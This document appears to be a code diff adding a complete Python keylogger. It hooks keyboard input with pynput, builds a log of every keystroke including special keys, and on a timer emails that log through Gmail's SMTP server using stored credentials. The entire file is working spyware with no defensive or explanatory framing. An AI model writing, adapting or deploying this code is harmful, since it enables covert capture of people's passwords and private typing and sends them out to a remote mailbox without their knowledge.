@@ -1,0 +1,33 @@
+from pynput import keyboard
+import smtplib
+from threading import Timer
+from config import EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_INTERVAL
+
+log = ""
+
+def send_email(email, password, message):
+    with smtplib.SMTP("smtp.gmail.com", 587) as server:
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+
+def callback(key):
+    global log
+    try:
+        log += key.char
+    except AttributeError:
+        if key == key.space:
+            log += " "
+        else:
+            log += f" [{str(key)}] "
+
+def report():
+    global log
+    if log:
+        send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, f"Keylog:\n\n{log}")
+        log = ""
+    Timer(SEND_INTERVAL, report).start()
+
+with keyboard.Listener(on_press=callback) as listener:
+    report()
+    listener.join()
